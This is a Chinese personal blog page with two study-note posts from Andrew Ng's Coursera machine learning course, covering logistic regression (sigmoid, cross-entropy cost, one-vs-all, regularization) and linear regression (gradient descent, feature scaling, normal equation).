              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2017-01-01 09:26:23" itemprop="dateCreated datePublished" datetime="2017-01-01T09:26:23+08:00">2017-01-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-28 17:41:58" itemprop="dateModified" datetime="2020-06-28T17:41:58+08:00">2020-06-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/mooc/" itemprop="url" rel="index"><span itemprop="name">MOOC</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2017/01/01/Logistic-Regression/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/01/01/Logistic-Regression/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="分类问题"><a href="#分类问题" class="headerlink" title="分类问题"></a>分类问题</h1><p>线性回归的内容讨论了如何使用线性模型进行回归学习，并对未来样本做出预测。但是，如果我们要解决分类问题的话，应该怎么做？可不可以利用线性模型来完成分类任务？</p>
<h2 id="利用线性回归解决分类问题"><a href="#利用线性回归解决分类问题" class="headerlink" title="利用线性回归解决分类问题"></a>利用线性回归解决分类问题</h2><p>对于二分类问题，一种简单的想法是，我们对一个简单的线性函数设置一个阈值（threshold）。我们使用一个线性函数对样本进行预测，当预测值大于 threshold 时，我们将样本的类别判断为真（或 1 ）；当预测值小于 threshold 时，我们将样本判断为假（或 0 ）。</p>
<p>我们需要将预测值转化为 0/1 值，所以我们可以定义模型为：</p>
<p>$$<br> y =<br>    \begin{cases}<br>        1 &amp; \quad h_{\theta} \geq 0.5 \<br>        0 &amp; \quad h_{\theta} &lt; 0.5    \<br>    \end{cases}<br>$$</p>
<p>但问题在于这个函数是不可靠的，例如，当我们有6个样本时，我们根据现有样本做线性回归，可以得到如下的拟合曲线：</p>
<p><img src="/images/2017-1-1/Group%202.png" alt="Group 2"></p>
<p>如图，下面的三个样本被判定为假，上面的三个样本被判定为真。但是当样本数量增加时， 我们的拟合曲线可能会造成判断错误，出现较大的误差。</p>
<p><img src="/images/2017-1-1/Group1.png" alt="Group1"></p>
<p>我们根据新的9个样本进行线性回归，到得到的新的回归曲线。在 $x = 1.25$ 处的样本，它的值大于0.5，应该被判断为真；但是新的回归曲线在该点的函数值小于0.5，所以该样本会被错误地判断为假。</p>
<p>所以，单纯地使用线性回归方法实现二分类是不合适的。</p>
<h2 id="Sigmoid-函数"><a href="#Sigmoid-函数" class="headerlink" title="Sigmoid 函数"></a>Sigmoid 函数</h2><p>我们可以使用 Sigmoid 函数，它有非常良好的数学性质，例如：单调可微，在 $0 \dots 1$ 之间变化等。Sigmoid 函数的表达式为： $$ y = \frac{1}{1 + \mathrm{e}^{-\mathrm{z}}} $$<br>它的函数图形为：</p>
<p><img src="/images/2017-1-1/Screen%20Shot%202016-12-31%20at%2020.52.42.png" alt="Screen Shot 2016-12-31 at 20.52.42"></p>
<p>在有了 Sigmoid 方程后，我们可以令 $ z = \theta^{T}x $。也可以得到：<br>$$ y = \frac{1}{1 + e^{-\theta^{T}x}} $$<br>即：<br>$$ ln\frac{y}{1-y} = \theta^{T}x $$<br>我们可以将 $y$ 看做样本 $x$ 为正例的可能性，将 $1 - y$ 看做样本 $x$ 为反例的可能性。也就是说，我们是在用线性回归模型的预测结果去逼近真实标记的对数几率。所以，这个模型被称为“对数几率回归”（Logistic Regression）。</p>
<p>在这个模型中，我们是直接对分类可能心进行建模，而且无需实现假设分布，这样就可以避免假设分布不准确所带来的问题；它不是仅仅预测出“类别”，而是可以得到近似的概率预测；最后，Sigmoid 函数是一种任意阶可导的凸函数，有很多数值计算方法可以用来求取最优解。</p>
<h1 id="Cost-Function"><a href="#Cost-Function" class="headerlink" title="Cost Function"></a>Cost Function</h1><p>对于线性回归模型，我们定义的代价函数（Cost Function）是所有模型误差的平方和。理论上讲，我们可以对逻辑回归模型沿用这个定义，但是问题在于，当我们将 $ h_{\theta} = \frac{1}{1 + e^{-\theta^{T}x}} $ 带入到代价函数中时，我们得到的代价函数将是非凸函数（non-convex function）。这意味着我们的代价函数有许多局部最小值，这将影响梯度下降算法寻找全局最小值。</p>
<p>所以，我们重新定义逻辑回归的代价函数为:</p>
<p>$$J(\theta) = \frac{1}{m}\sum_{1}^{m}Cost(h_{\theta}(x^{(i)}, y^{(i)}))$$</p>
<p>其中：</p>
<p>$$ Cost(h_{\theta}, y) =<br>\begin{cases}<br>        -log(h_{\theta}(x))     &amp; \quad y = 1 \<br>        -log(1 - h_{\theta}(x)) &amp; \quad y = 0 \<br>\end{cases}<br>$$</p>
<p>$h_{\theta}(x)$与$Cost(h_{\theta}(x), y)$之间的关系如下图所示：</p>
<p><img src="/images/2017-1-1/Screen%20Shot%202017-01-01%20at%2019.33.08.png" alt="Screen Shot 2017-01-01 at 19.33.08"><br><img src="/images/2017-1-1/Screen%20Shot%202017-01-01%20at%2019.33.37.png" alt="Screen Shot 2017-01-01 at 19.33.37"></p>
<p>这样构建的 $Cost(h_{\theta},y)$ 的特点是：当实际的$y=1$且$h_{\theta}$也为1时误差为0，当$y = 1$但$h_{\theta}$不为1时，误差随着$h_{\theta}$的变小而变大；当实际的$y = 0$且$h_{\theta}$也为0时，代价为0，当$y=0$但$h_{\theta}$不为0时，误差随着$h_{\theta}$的变大而变大。</p>
<p>这样，我们可以得到简化后的 $Cost(h_{\theta}(x), y)$:</p>
<p>$$ Cost(h_{\theta}(x),y) = -ylog(h_{\theta}(x))-(1-y)log(1-h_{\theta}(x))$$</p>
<p>带入代价方程我们可以得到：</p>
<p>$$<br>J(\theta) = -\frac{1}{m}[\sum_{i=1}^{m}y^{(i)}logh_{\theta}(x^{(i)})+(1-y^{(i)})og(1-h_{\theta}(x))]<br>$$</p>
<p>有了这样一个代价函数后，我们就可以使用梯度下降的算法来求得能使代价最小的参数了。</p>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>查了梯度下降算法外，我们还可以使用一些常常被用来计算最小代价的算法，这些算法更加复杂和优越，而且不需要人工干预学习率，且比梯度下降算法更加快速。比如：Conjugate Gradient, BFGS, L-BFGS等。我们在实现求解 Logistic Regression 的参数的时候，可以跟根据自己所使用的语言或平台来利用这些函数，从而实现快速、高效的参数学习。</p>
<h1 id="多分类问题"><a href="#多分类问题" class="headerlink" title="多分类问题"></a>多分类问题</h1><p>在多分类问题中，我们要训练的样本属于多个类，我们无法使用二元变量对这些类别进行区分。例如，我们要预测一个学生的学习情况，可分为：差、良和优秀。一种解决多分类问题的方法被称为 “One-vs-All” 算法。</p>
<h2 id="One-vs-All"><a href="#One-vs-All" class="headerlink" title="One-vs-All"></a>One-vs-All</h2><p>使用 “One-vs-All” 方法，我们将多分类问题，转化为二分类问题。为了实现这样的转变，我们将其中的一个类标记为正类（$y = 1$），其他所有类别标记为负类，这个模型被记作$h_{\theta}^{(1)}(x)$。接着类似地我们将另外一个类选择为正类（$y=2$），其他类别标记为负类，这个模型被记作$h_{\theta}^{(2)}(x)$。以此类推。</p>
<p>我们可以得到分类器模型：$h_{\theta}^{(i)}=p(y=i|x;\theta) \quad i \in [1 \dots k]$。</p>
<p>在预测中，我们要运行每一个分类器，并对每一个输入变量，都选择最高可能性的输出变量。</p>
<h2 id="过度拟合问题（Overfitting）"><a href="#过度拟合问题（Overfitting）" class="headerlink" title="过度拟合问题（Overfitting）"></a>过度拟合问题（Overfitting）</h2><p>如果我们的模型中有数目过多的属性，那么我们通过学习所得到的属性可能会非常好得适应训练样本（代价函数的值几乎为0），但是可能无法推广到新的样本中。</p>
<p>如果我们遇到了过拟合问题，一般有两种方法：</p>
<ol>
<li>减少属性数目<br> 可以是手工选择保留那些属性，也可以运行某些属性选择算法。</li>
<li>归一化（Regularization）<br> 保留所有的属性，但是减少某些属性的重要性（Magnitude）。当我们有很多对预测结果有略微作用的属性时，归一化的效果非常好。</li>
</ol>
<h2 id="Regularization"><a href="#Regularization" class="headerlink" title="Regularization"></a>Regularization</h2><h3 id="Regularization-Cost-Funtion"><a href="#Regularization-Cost-Funtion" class="headerlink" title="Regularization - Cost Funtion"></a>Regularization - Cost Funtion</h3><p>例如在某问题中，我们的预测模型为：</p>
<p>$$ h_{\theta}(x)=\theta_{0}+\theta_{1}x_{1}+\theta_{2}x_{2}^{2}+\theta_{3}x_{3}^{3}+\theta_{4}x_{4}^{4} $$</p>
<p>我们决定减少$\theta_3$和$\theta_4$的作用，要做得就是修改代价函数，为$\theta_3$和$\theta_4$设置一点惩罚。这样的话，我们在尝试最小化代价函数的同时，也需要将这个惩罚纳入考虑中，修改后的代价函数可以是：<br>$$<br>min_{\theta}\frac{1}{2m}\sum_{i=1}^{m}((h_{\theta}(x^{(i)})-y^{(i)})+1000\theta_{3}^{2}+10000\theta_{4}^{2})<br>$$</p>
<p>通过这样的代价函数，我们选择得出的$\theta_{3}$和$\theta_{4}$对预测结果的影响要比之前小得多。</p>
<p>假如我们有非常多的特征，我们并不知道其中哪些特征我们要惩罚，我们将对所有的特征进行惩罚，并且让代价函数最优化的软件来选择这些惩罚的程度。这样的结果是得到了一个较为简单的能防止过拟合问题的假设：</p>
<p>$$<br>J(\theta)=\frac{1}{2m}\big[\sum_{i=1}^{m}((h_{\theta}(x^{(i)})-y^{(i)})^{2})+\lambda\sum_{j=1}^{n}{\theta}_{j}^{2} \big]<br>$$</p>
<p>注意：我们不对$\theta_{0}$进行惩罚。</p>
<p>但是如果选择归一化参数$\lambda$过大的话，则会把所有参数的作用都减小，可能造成欠拟合。</p>
<h3 id="Regularized-Linear-Regression"><a href="#Regularized-Linear-Regression" class="headerlink" title="Regularized Linear Regression"></a>Regularized Linear Regression</h3><p>归一化的线性回归代价函数为：</p>
<p>$$<br>J(\theta)=\frac{1}{2m}\big[ \sum_{i=1}^{m}((h_{\theta}(x^{(i)})-y^{(i)})^{2}+\lambda\sum_{j=1}^{m}\theta_{j}^{2}) \big]<br>$$</p>
<p>如果我们采用梯度下降来实现这个代价函数的最小化，因为我们没有对$\theta_0$进行归一化，所以梯度下降算法将分为两种情形：</p>
<p>$$<br>\quad \theta_0=\theta_0-\alpha\frac{1}{m}\sum_{i=1}^{m}\big[ h_{\theta}(x^{(i)})-y^{(i)} \big]x_{0}^{(i)} \<br>\quad \theta_{j}=\theta_{j}-\alpha\bigg[ \big[\frac{1}{m}\sum_{i=1}^{m}(h_{\theta}(x^{(i)})-y^{(i)})x_{j}^{(i)} \big]+\frac{\lambda}{m}\theta_{j} \bigg]  \<br>j \in [1 \dots n]<br>$$</p>
<p>对上式变化可得：</p>
<p>$$<br>\theta_j=\theta_{j}(1-\alpha\frac{\lambda}{m})-\alpha\frac{1}{m}\sum_{i=1}^{m}(h_{\theta}(x^{(i)})-y^{(i)})x_j^{(i)}<br>$$</p>
<p>我们可以看到，归一化方程的梯度下降算法就是在每次迭代过程中，令$\theta$减少一个额外的值。</p>
<h2 id="Normal-Equation"><a href="#Normal-Equation" class="headerlink" title="Normal Equation"></a>Normal Equation</h2><p>我们也可以使用正规方程来求解归一化线性回归模型：</p>
<p>$$<br>\theta = ( X^{T}X - {\lambda}L )^{-1}X^{T}y<br>$$</p>
<p>其中：</p>
<p>$$<br>L =<br>\begin{bmatrix}<br>0 \<br>\quad &amp; 1 \<br>\quad &amp; \quad &amp; \ddots \<br>\quad &amp; \quad &amp; \quad &amp; 1 \<br>\end{bmatrix}_{(m+1) \times (n+1)}<br>$$</p>
<p>注意：如果$X^{T}X$不可逆，则$X^{T}X+{\lambda}L$也不可逆。</p>
<h1 id="错题集锦"><a href="#错题集锦" class="headerlink" title="错题集锦"></a>错题集锦</h1><p>下面是我在完成<a href="https://www.coursera.org/learn/machine-learning/home" target="_blank" rel="noopener">课程</a>的小测验过程中的错题，我将相关知识点罗列如下：</p>
<ol>
<li>在模型中添加新的属性仅仅可以提高在训练集上的匹配程度。</li>
<li>在$m \geq 1 $个样本上训练得到的 Logistic Regression 代价函数一定大于等于1.</li>
<li>Logistic Regression 的代价函数是“凸函数”，所以梯度下降算法一定会达到全局最优点。但是我们依然可能选择使用优化算法，因为这些算法可以更加高效地习得模型的最佳参数，并且不需要我们选择 Learning Rate。</li>
<li>通过添加新的属性，我们的模型一定会更加精确地表达样本的特点，从而可以习得更加复杂的假设来匹配训练样本。</li>
<li>当$\lambda$被设为1时，我们使用归一化来减少$\theta$的值。这样，$\theta$会更小。</li>
<li>归一化通过“惩罚”参数的作用，可能会实现一个更简单的模型，会分类错误更多的样本。</li>
<li>如果算法在一个训练样本上的分类效果很差的话，这意味着模型处于欠拟合状态。这种情况下，以应该通过增加属性数量、使用多项式回归等方法来提高模型的性能。</li>
</ol>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://www.amazon.cn/%E5%9B%BE%E4%B9%A6/dp/B01ARKEV1G" target="_blank" rel="noopener">机器学习</a> 周志华</li>
<li><a href="https://www.coursera.org/learn/machine-learning/home" target="_blank" rel="noopener">Machine Learning</a> Stanford</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2016/12/22/Linear-Regression/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/12/22/Linear-Regression/" class="post-title-link" itemprop="url">【机器学习课程笔记】| 线性回归（Linear Regression）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2016-12-22 20:37:23" itemprop="dateCreated datePublished" datetime="2016-12-22T20:37:23+08:00">2016-12-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-28 17:41:58" itemprop="dateModified" datetime="2020-06-28T17:41:58+08:00">2020-06-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/mooc/" itemprop="url" rel="index"><span itemprop="name">MOOC</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2016/12/22/Linear-Regression/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/12/22/Linear-Regression/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h1><p>我从这周开始在<a href="https://www.coursera.org/" target="_blank" rel="noopener">Course</a>上开始了对Machine Learning的学习，注册了吴恩达教授的<a href="https://www.coursera.org/learn/machine-learning/home" target="_blank" rel="noopener">机器学习</a>课程。所以我准备在自己的博客上整理课程的学习笔记，并记录自己的思考。</p>
<h2 id="什么是机器学习"><a href="#什么是机器学习" class="headerlink" title="什么是机器学习"></a>什么是机器学习</h2><p>机器学习：致力于研究如何通过计算的手段，利用经验来来改善系统自身的性能。我们把经验数据提供给学习算法，它就能根据这些数据产生模型；在面对新的情况时，模型就可以给我们提供相应的判断。如果说计算机科学是研究关于“算法”的学问，那么我们可以说机器学习是研究“学习算法”的学问。</p>
<p>机器学习也有更学术化的定义：</p>
<blockquote>
<p>假设用 P 来评估计算机程序在某任务上的性能，若一个程序通过利用经验 E 在 T 中任务上获得了性能呢改善，则我们就说关于 T 和 P，该程序对 E 进行了学习。   — Mitchell</p>
</blockquote>
<p>注意，机器学习的目标是使学习得到的模型能很好得适用于<strong>新样本</strong>。</p>
<h3 id="监督学习（Supervised-Learning）和非监督学习-Unsupervised-Learning"><a href="#监督学习（Supervised-Learning）和非监督学习-Unsupervised-Learning" class="headerlink" title="监督学习（Supervised Learning）和非监督学习(Unsupervised Learning)"></a>监督学习（Supervised Learning）和非监督学习(Unsupervised Learning)</h3><p>根据训练数据是否有标记信息，机器学习的任务和分为两大类：监督学习（Supervised Learning）和非监督学习（Unsupervised Learning）。对于监督学习任务，我们明确得知道数据具有某些特点或者事先已经知道了样本将会属于什么类别，例如将西瓜分为“好瓜”与“坏瓜”，根据历史房价来预测未来房价；而对非监督学习任务，我们事先也不知道算法所产生的结果所具有的特点，例如对西瓜做聚类（Clusting）后，可能将西瓜分为“浅色瓜”和“深色瓜”等我们事先不知道的概念。监督学习有两种典型的任务：分类（Classification）和回归（Regression）。如果我们希望预测的是离散值，如“好瓜”或“坏瓜”、“盈利”或“亏损”等，那么该任务为分类任务；如果我们希望预测的是连续值，如在未来某个时间节点的房价、股票价格，那么该任务为回归任务。</p>
<h1 id="线性回归（Linear-Regression）"><a href="#线性回归（Linear-Regression）" class="headerlink" title="线性回归（Linear Regression）"></a>线性回归（Linear Regression）</h1><p>线性模型是一种简单、易于建模的模型，我们可以根据已有数据学习得到线性函数中的参数。得到参数的过程叫做线性回归(Linear Regression)。<br>现在假设我们得到了房产面积和房价的数据，而希望预测某个面积房产的房价。首先，我们需要根据已有的数据估计出模型的函数表达式。为了直观显示房产面积和房价的关系，我们可以将房价的数据绘制出来，观察数据间的关系。</p>
<p><img src="/images/2016-12-25/points.png" alt="points"><br>根据住房面积和房价之间的散点图，我们可以认为面积和房价成线性关系，即可以假设房价 y 和面积 x 的函数关系为：</p>
<p>$$ h_{\theta}(x) = \theta_0 + \theta_1x $$</p>
<p>其中 $x$ 模型的属性。<br>之后，我们就需要通过“学习”已有的数据，得到函数用得系数值。</p>
<h2 id="成本函数（Cost-Function）"><a href="#成本函数（Cost-Function）" class="headerlink" title="成本函数（Cost Function）"></a>成本函数（Cost Function）</h2><p>在实现“回归”之前，我们将 Cost Function 定义为：</p>
<p>$$ J( \theta_0 , \theta_1 ) = \frac{1}{2m}\sum_{i=1}^{m}(h_{\theta}(x_i) - y_i)^2 $$</p>
<p>这个函数定义了使用现有模型得出的 m 个预测值和实际值的均方误差（square loss）的平均值，而前面的 $\frac{1}{2}$ 则是为了之后的处理方便而添加的。</p>
<p>所以，我们的“回归”过程的目的，就是通过对“学习数据”的学习，得到一个模型，是得 Cost Function 的值最小。</p>
<h2 id="梯度下降（Gradient-Descent）"><a href="#梯度下降（Gradient-Descent）" class="headerlink" title="梯度下降（Gradient Descent）"></a>梯度下降（Gradient Descent）</h2><p>在机器学习中，常用梯度下降（Gradient Descent）的方法，通过不断迭代，学习得到使得 $J(\theta_0, \theta_1)$ 最小的 $\theta_0$ 和 $\theta_1$ 的值。</p>
<p>梯度下降方法的基本过程可以用伪代码来表示：</p>
<p>repeat until converage {</p>
<p>$$\theta_0 = \theta_0 - \alpha\sum_{i=1}^{m}(h_\theta(x_i) - y_i)$$</p>
<p>$$\theta_1 = \theta_1 - \alpha\sum_{i=1}^{m}((h_\theta(x_i) - y_i)x_i)$$</p>
<p>}</p>
<p>要注意的是，$\theta_0$和$\theta_1$必须要被同步更新，否则会导致算法出错。</p>
<p>我们可以研究下，为什么通过梯度下降的方式可以最终迭代到最优点。以一个简单的二次函数为例：</p>
<p><img src="/images/2016-12-25/group.png" alt="group"></p>
<p>假设我们从 A 点开始使用梯度下降的方法迭代，该函数在 A 点的导数小于零，所以在梯度下降的过程中，$\theta = \theta - \alpha\frac{\mathrm d}{\mathrm d x}J(x)$ 会使得 $\theta$ 不断向右逼近，从而接近最低点。在 B 点同理可得，在梯度下降的过程中，$\theta$ 会不断向左逼近，靠近最低点。</p>
<p>在梯度下降的迭代过程中，我们通过选择不同的 $\alpha$ 值来控制 $\theta$ 变化的幅度或大小。当 $\theta$ 越小时，算法迭代的过程就以越小的步伐(更高的精度)来逼近最优点。所以，$\alpha$ 被称为 Learning Rate。</p>
<p>当 $\alpha$ 足够小的时候，梯度下降算法一定会最终抵达最优点。而且在迭代过程中不需要改变 $\alpha$ 的值，算法最终一定会收敛。这在数学上已经得到了证明。</p>
<p>但是要注意，梯度下降算法最终找到的是<strong>局部</strong>最优点，而不一定是全局最优点。</p>
<h2 id="多元线性回归（Linear-Regression-with-Multiple-Variables）"><a href="#多元线性回归（Linear-Regression-with-Multiple-Variables）" class="headerlink" title="多元线性回归（Linear Regression with Multiple Variables）"></a>多元线性回归（Linear Regression with Multiple Variables）</h2><p>在单变量线性回归问题中，我们假设模型只有一个属性。而在多元线性回归问题中，我们认为模型有多个属性。例如，在之前提到的预测房价的问题中，房价可能不仅仅有房产的面积所决定，还会被房产的年代、地段等因素影响。</p>
<p>在队员线性回归问题中，我们用变量 n 来代表模型属性的个数，$x^{(i)}$ 是一个行向量表示第 i 个训练样本的属性集，$x_j^{(i)}$ 表示第 i 个训练样本的第 j 个属性的值。</p>
<p>我们令 $x_0=1$ ，那么我们的模型和定义为：</p>
<p>$$h_{\theta}(x) = \theta_0 + {\theta_1}x_1 + {\theta_2}x_2 + \cdots + {\theta_n}x_n$$</p>
<p>即：</p>
<p>$$ h_{\theta}(x) = {\theta}^{T}x $$</p>
<p>其中：</p>
<p>$ {\theta^{T}} = [\theta_0, \theta_1, \cdots, \theta_n], x^{T} = [1, x_1, x_2, \cdots, x_n] $</p>
<p>现在我们在多元线性回归问题中使用梯度下降方法学习得到模型参数的过程可以写为：</p>
<p>repeat until converage {</p>
<p>$$ \theta_{j} = \theta_{j} - \alpha\frac{1}{m}\sum_{i=1}^{m}(h_{\theta}(x^{(i)} - y^{(i)})x_j^{(i)}) $$</p>
<p>$$j = 1 \cdots n$$</p>
<p>}</p>
<p>注意，各参数必须<strong>同步</strong>更新。</p>
<h2 id="加速收敛方法"><a href="#加速收敛方法" class="headerlink" title="加速收敛方法"></a>加速收敛方法</h2><p>在课程中，吴恩达教授还介绍了几种可以加速梯度下降过程的方法，分别是：Feature Scaling, Mean Normalization 和 选择 Learning Rate 的方法。</p>
<h3 id="Feature-Scaling"><a href="#Feature-Scaling" class="headerlink" title="Feature Scaling"></a>Feature Scaling</h3><p>Feature Scaling 的主要原理是各个模型在数值上处于同一个“范围”，如都在$[0, 1]$这个范围。在预测房价的例子中，我们假设房产有属性：房产面积 $x_1 \in [0, 2000]$, 卧室数目 $x_2 \in [0, 5]$ 。这两个属性不在同一个数量级，那么在梯度下降的迭代过程中，可能出现算法收敛过慢，收敛路径复杂等问题。</p>
<p>为了解决这个问题，我们使用 Feature Scaling 方法，使得:</p>
<p>$$x_1 = \frac{x_1}{2000}$$ $$x_2 = \frac{x_2}{5}$$</p>
<p>或者我们使用 Mean Normalization 方法。令 $\mu_i = mean(x_i)$ , 有：</p>
<p>$$x_i = \frac{x_i - \mu_i}{max(x_i) - min(x_i)}$$</p>
<p>通过这两种方法，我们可以将所有属性在数值上属于同一范围，从而可以显著梯度下降的迭代速度。</p>
<h3 id="选择合理的-Learning-Rate"><a href="#选择合理的-Learning-Rate" class="headerlink" title="选择合理的 Learning Rate"></a>选择合理的 Learning Rate</h3><p>另外一种保证算法收敛的方式就是要选择一个大小合适的 Learning Rate。因为如果 $\alpha$ 过小，那么算法会收敛过慢；如果 $aplha$ 过大，可能导致算法无法保证在每次迭代使得参数减小。</p>
<p>我们可以将使用不同 Learning Rate 的迭代过程用可视化的方式表示出来，通过这种更形象的方式选择合适的 Learning Rate。</p>
<h3 id="多项式回归（Polynomial-Regression）"><a href="#多项式回归（Polynomial-Regression）" class="headerlink" title="多项式回归（Polynomial Regression）"></a>多项式回归（Polynomial Regression）</h3><p>我们可以将多个属性组合成一个新的属性用于对模型参数的预测，例如将房产的地基长度x1和地基宽度x2组合为房产面积x3。</p>
<p>当我们的训练数据不能很好得用线性函数描述时，我们可以考虑使用二次或三次函数。</p>
<h2 id="Normal-Equation"><a href="#Normal-Equation" class="headerlink" title="Normal Equation"></a>Normal Equation</h2><p>在线性回归的问题中，我们的目的是通过学习训练数据，得到新的参数 $\theta$ 使得 $J(\theta)$ 最小。体用微积分的知识，我们可以对 $J(\theta)$ 中的 $\theta_0$ , $\theta_1$ 等分别求偏导数，并同时令偏导数等于0，即可算出使得 $J(\theta)$ 最小的参数值。</p>
<p>结论： 当 $\theta = (X^{T}X)^{-1}X^{T}y$时，$J(\theta)$ 最小。</p>
<p>我们对比梯度下降和 Normal Equation 方法：</p>
<p>| 梯度下降 | Normal Equation |<br>| 需要选择合适的 Learning Rate | 不需要选择Learning Rate |<br>| 需要多次迭代 | 不需要迭代 |<br>| 时间复杂度 O(kn^2) | 时间复杂度 O(n^3) |<br>| 在样本数量很大时，很有效 | 样本数量很大时，效率很低 |</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://www.amazon.cn/%E5%9B%BE%E4%B9%A6/dp/B01ARKEV1G" target="_blank" rel="noopener">机器学习</a> 周志华</li>
<li><a href="https://www.coursera.org/learn/machine-learning/home" target="_blank" rel="noopener">Machine Learning</a> Stanford</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Chuanlei Guo</p>
  <div class="site-description" itemprop="description">正因为未知，人与人之间的羁绊才愈发迷人</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">24</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">24</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/ChuanleiGuo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ChuanleiGuo" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:chuanleiguo@gmail.com" title="E-Mail → mailto:chuanleiguo@gmail.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="http://weibo.com/bestchuan" title="Weibo → http:&#x2F;&#x2F;weibo.com&#x2F;bestchuan" rel="noopener" target="_blank"><i class="weibo fa-fw"></i>Weibo</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Chuanlei Guo</span>
</div>
